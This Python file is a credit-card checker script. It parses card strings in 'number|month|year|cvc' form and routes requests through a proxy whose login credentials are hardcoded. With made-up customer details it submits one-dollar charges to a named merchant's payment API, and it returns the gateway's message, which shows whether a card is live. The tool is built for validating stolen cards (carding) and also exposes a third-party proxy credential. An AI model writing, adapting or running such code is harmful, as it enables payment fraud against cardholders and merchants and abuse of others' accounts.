import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'www.idisecurepay.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://www.idisecurepay.com',
	    'referer': 'https://www.idisecurepay.com/?ou=24&name=Plays+of+the+Day&proc=s',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'country': {
	        'value': 'USA',
	        'label': 'USA',
	    },
	    'phone': f'4303000{random_amount1}{random_amount2}',
	    'address': 'Street 27',
	    'city': 'New York',
	    'state': {
	        'value': 'NY',
	        'label': 'New York',
	    },
	    'zip': '10080',
	    'cardNumber': n,
	    'cvv': cvc,
	    'expiryDate': f'{mm}{yy}',
	    'nameOnCard': 'Rodam User',
	    'paymentAmount': 1,
	    'terms': False,
	    'transId': '',
	    'meta': {
	        'userId': '24',
	        'name': 'Plays of the Day',
	        'ispp': None,
	        'referrer': None,
	        'proc': 's',
	        'isSandbox': False,
	    },
	}
	
	response = session.post('https://www.idisecurepay.com/api/payment', headers=headers, json=json_data)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
		
	return (result)
